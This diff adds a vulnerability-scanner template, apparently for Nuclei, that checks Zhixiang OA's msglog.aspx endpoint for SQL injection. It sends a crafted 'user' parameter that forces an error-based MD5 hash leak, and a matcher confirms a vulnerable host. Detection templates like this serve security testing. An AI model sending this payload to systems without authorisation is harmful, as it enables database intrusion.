@@ -1,0 +1,23 @@
+id: zhixiang-oa-msglog-sqli
+
+info:
+  name: Zhixiang OA msglog.aspx - SQL injection
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /mainpage/msglog.aspx?user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27127381%27))))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code==500 && contains_all(body,'43f845fa0c8aef9104f8e1b07625ecf8')"
